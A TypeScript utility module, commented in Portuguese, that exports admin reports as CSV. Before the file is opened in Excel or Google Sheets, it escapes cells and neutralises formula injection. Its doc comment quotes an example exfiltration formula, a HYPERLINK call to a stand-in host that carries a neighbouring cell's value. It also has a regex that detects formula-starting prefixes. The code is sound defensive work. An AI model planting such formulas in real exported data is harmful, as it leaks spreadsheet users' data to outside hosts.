/**
 * Uma celula de CSV, escapada e NEUTRALIZADA contra formula.
 *
 * Aspas resolvem virgula e quebra de linha; nao resolvem FORMULA — o Excel tira
 * as aspas e depois avalia a celula, entao `"=1+1"` vira formula do mesmo jeito.
 *
 * O caminho e real: `nome` e gravavel pelo proprio cliente (`Conta.tsx`) e
 * `empresa` vem do cadastro dele; os dois saem nos relatorios que o admin
 * exporta e abre (`CustomerActivity`, `CustomersPerformance`).
 *
 * O risco pratico nao e executar programa — DDE esta desligado por padrao no
 * Excel moderno — e sim EXFILTRACAO: `=HYPERLINK("http://x?d="&A2,"abrir")` no
 * Excel, ou `=IMPORTXML`/`=IMAGE` no Google Sheets, que carregam sozinhos e
 * levam a celula vizinha junto.
 *
 * A aspa simples na frente e a convencao: o Excel a consome e mostra o texto.
 *
 * NUMERO passa direto, sem aspas e sem prefixo: nao vem de entrada de usuario e
 * precisa continuar sendo numero na planilha (senao toda coluna de total vira
 * texto e para de somar).
 *
 * Exportada para ter teste proprio — a funcao que a usa baixa arquivo e nao
 * devolve nada.
 */
export function escaparCelulaCSV(val: unknown): string | number {
  if (val == null) return '""';
  if (typeof val === "number") return val;
  const texto = String(val);
  // NUMERO E TELEFONE NAO SAO FORMULA.
  //
  // A primeira versao prefixava tudo que comecasse com `+` ou `-`, e isso quebrou
  // o ciclo export -> Excel -> import que o proprio Ferramentas.tsx descreve como
  // uso normal: `clientes.telefone` e TEXT e telefone B2B comeca com `+`, entao
  // `+1 786 555 0100` voltava do arquivo como `'+1 786 555 0100` e o apostrofo era
  // GRAVADO no banco. Mesmo caminho em `ProductExport` (`barcode`,
  // `reference_code`, `product_upc`), que alimenta o B2BWave.
  //
  // `=` e `@` sao sempre formula. `+`/`-` so quando NAO e um numero ou telefone
  // puro — `+1+1` e formula, `+1 786 555 0100` e dado.
  const soNumeroOuTelefone = /^[+-]?[\d\s().-]+$/.test(texto);
  const perigoso = /^[=@\t\r]/.test(texto) || (/^[+-]/.test(texto) && !soNumeroOuTelefone);
  const seguro = perigoso ? `'${texto}` : texto;
  return `"${seguro.replace(/"/g, '""')}"`;
}

export function exportToCSV(data: Record<string, any>[], filename: string, columns?: { key: string; label: string }[]) {
  if (!data.length) return;

  const cols = columns || Object.keys(data[0]).map((k) => ({ key: k, label: k }));
  const header = cols.map((c) => `"${c.label}"`).join(",");
  const rows = data.map((row) => cols.map((c) => escaparCelulaCSV(row[c.key])).join(","));

  const csv = [header, ...rows].join("\n");
  const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `${filename}_${new Date().toISOString().slice(0, 10)}.csv`;
  a.click();
  // Revogar na linha seguinte ao click cancelava o download em alguns navegadores
  // (o blob morria antes de a gravacao comecar).
  setTimeout(() => URL.revokeObjectURL(url), 10000);
}

export function formatCurrency(value: number) {
  return new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(value);
}

export function formatNumber(value: number) {
  return new Intl.NumberFormat("en-US").format(value);
}
